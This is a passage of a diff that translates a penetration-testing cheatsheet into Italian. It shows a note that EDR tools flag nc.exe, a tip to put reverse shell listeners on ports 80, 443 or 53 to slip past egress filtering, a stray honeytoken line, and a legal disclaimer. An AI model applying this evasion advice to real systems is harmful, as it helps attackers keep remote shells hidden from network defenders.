+   - Su Windows, gli agenti EDR contrassegnano o mettono in quarantena regolarmente i file binari `nc.exe` a causa di firme statiche note.
+3. **Restrizioni in entrata del firewall:**
+   - Scegli sempre porte in uscita comuni (`80`, `443`, `53`) quando configuri i listener di shell inversa per aggirare le rigide politiche di filtraggio in uscita.
 
 ---
 
-## ⚠️ Legal Disclaimer
+## ⚠️ Disclaimer legale
 
-3. **Honeytokens:** Plant attractive DNS records (e.g., `backup-vault.corp.local` or `admin-portal.corp.local`) pointing to honeypot IP addresses.
-> This cheatsheet is designed for authorized penetration testing, vulnerability assessment, CTF competitions, and system administration purposes only. Intercepting network traffic, exfiltrating data, or executing reverse shells against systems without explicit written consent is illegal and punishable under cybersecurity laws worldwide. Use responsibly and ethically.
+> [!ATTENZIONE]
+> Questo cheatsheet è progettato esclusivamente per test di penetrazione autorizzati, valutazione delle vulnerabilità, competizioni CTF e scopi di amministrazione del sistema. Intercettare il traffico di rete, esfiltrare dati o eseguire reverse shell contro sistemi senza esplicito consenso scritto è illegale e punibile in base alle leggi sulla sicurezza informatica in tutto il mondo. Utilizzare in modo responsabile ed etico.
